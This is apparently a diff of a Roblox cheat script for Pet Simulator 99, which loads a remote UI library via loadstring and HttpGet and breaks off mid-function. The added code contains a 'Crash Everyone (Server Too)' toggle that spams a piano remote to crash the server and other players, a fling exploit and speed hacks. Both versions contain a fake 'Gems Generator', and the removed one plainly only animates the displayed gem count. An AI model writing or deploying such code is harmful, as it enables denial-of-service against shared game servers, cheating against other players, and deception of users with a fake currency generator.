@@ -1,97 +1,41 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+-- Load Rayfield UI Library local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local plr = Players.LocalPlayer
+-- Variables local Players = game:GetService("Players") local RunService = game:GetService("RunService") local plr = Players.LocalPlayer
 
--- Create the window
-local Window = Rayfield:CreateWindow({
-    Name = "Nil Scripts || Pet Simulator 99 🐶",
-    LoadingTitle = "Loading...",
-    LoadingSubtitle = "Please wait...",
-    ConfigurationSaving = {
-        Enabled = false,
-    },
-    Discord = {
-        Enabled = false,
-    },
-    KeySystem = false,
-    Theme = Rayfield.Themes.Dark,
-})
+-- UI Setup local Window = Rayfield:CreateWindow({ Name = "Nil Scripts || Pet Simulator 99 🐶", LoadingTitle = "Loading Nil Scripts...", LoadingSubtitle = "by Agreed", Theme = "DarkBlue", })
 
--- Main Tab
-local MainTab = Window:CreateTab("Main", 4483362458)
-MainTab:CreateSection("Basic Tools")
+-- Main Tab local MainTab = Window:CreateTab("Main")
 
-MainTab:CreateSlider({
-    Name = "Walkspeed",
-    Range = {16, 160},
-    Increment = 1,
-    CurrentValue = 16,
-    Callback = function(Value)
-        if plr.Character and plr.Character:FindFirstChild("Humanoid") then
-            plr.Character.Humanoid.WalkSpeed = Value
-        end
-    end,
-})
+MainTab:CreateSection("Ctrl + Shift + F7 to see ping!")
 
--- Gems Generator Tab
-local GemsTab = Window:CreateTab("Gems Generator", 4483362458)
-GemsTab:CreateSection("Generate Gems")
+MainTab:CreateToggle({ Name = "Crash Everyone (Server Too)", CurrentValue = false, Callback = function(Value) _G.crash = Value local pianoRemote = workspace:FindFirstChild("GlobalPianoConnector") if not pianoRemote then Rayfield:Notify({ Title = "Error!", Content = "Piano remote not found!", Duration = 10 }) return end
 
-local InputBox
-local TargetAmountLabel = plr:WaitForChild("PlayerGui"):WaitForChild("BucksIndicatorApp")
-    :WaitForChild("CurrencyIndicator"):WaitForChild("Container"):WaitForChild("Amount")
-
-local function FormatNumber(n)
-    local s = tostring(n)
-    local formatted = s:reverse():gsub("(%d%d%d)", "%1,"):reverse()
-    if formatted:sub(1, 1) == "," then
-        formatted = formatted:sub(2)
-    end
-    return formatted
-end
-
-local function AnimateGemUpdate(amount)
-    local current = tonumber(TargetAmountLabel.Text:gsub(",", "")) or 0
-    local target = current + amount
-    local steps = 30
-    local increment = (target - current) / steps
-
-    for i = 1, steps do
-        local val = math.floor(current + increment * i)
-        TargetAmountLabel.Text = FormatNumber(val)
-        wait(0.03)
-    end
-    TargetAmountLabel.Text = FormatNumber(target)
-end
-
-InputBox = GemsTab:CreateInput({
-    Name = "Gem Amount",
-    PlaceholderText = "Enter amount of gems",
-    RemoveTextAfterFocusLost = false,
-    Callback = function(Value)
-        -- Optional input check can go here
-    end,
-})
-
-GemsTab:CreateButton({
-    Name = "Generate Gems",
-    Callback = function()
-        local val = tonumber(InputBox.Value)
-        if val then
-            AnimateGemUpdate(val)
-            Rayfield:Notify({
-                Title = "Success",
-                Content = "Gems generated!",
-                Duration = 2,
-            })
+if Value then
+        if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid").Sit then
+            Rayfield:Notify({ Title = "Enabled!", Content = "Lag incoming!", Duration = 5 })
+            while _G.crash do
+                for i = 1, 61 do pianoRemote:FireServer("play", i) end
+                task.wait()
+            end
+            pianoRemote:FireServer("abort")
+            Rayfield:Notify({ Title = "Disabled!", Content = "Crash stopped.", Duration = 3 })
         else
-            Rayfield:Notify({
-                Title = "Error",
-                Content = "Please enter a valid number.",
-                Duration = 2,
-            })
+            Rayfield:Notify({ Title = "Error!", Content = "You must sit at the piano!", Duration = 3 })
         end
-    end,
+    end
+end,
+
 })
+
+MainTab:CreateSection("^^^ Works best against low-end devices! ^^^")
+
+MainTab:CreateToggle({ Name = "Flinger", CurrentValue = false, Callback = function(Value) _G.fling = Value local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") if Value and root then local bav = Instance.new("BodyAngularVelocity", root) bav.Name = "FlingAngularVelocity" bav.AngularVelocity = Vector3.new(0, 99999, 0) bav.MaxTorque = Vector3.new(0, math.huge, 0) bav.P = math.huge for _, part in ipairs(plr.Character:GetChildren()) do if part:IsA("BasePart") then part.CanCollide = false part.Massless = true end end plr.Character:FindFirstChildOfClass("Humanoid").Died:Connect(function() bav:Destroy() end) elseif root then for _, obj in ipairs(root:GetChildren()) do if obj:IsA("BodyAngularVelocity") then obj:Destroy() end end end end, })
+
+MainTab:CreateSlider({ Name = "Walkspeed", Range = {16, 160}, Increment = 1, CurrentValue = 16, Callback = function(Value) if plr.Character then plr.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = Value end end, })
+
+-- Diamond Generator Tab local GemsTab = Window:CreateTab("💎 Gems Generator") local Input = ""
+
+GemsTab:CreateInput({ Name = "Enter Gem Amount", PlaceholderText = "e.g. 5000000", RemoveTextAfterFocusLost = false, Callback = function(Value) Input = Value end, })
+
+GemsTab:CreateButton({ Name = "Generate Gems", Callback = function()
+
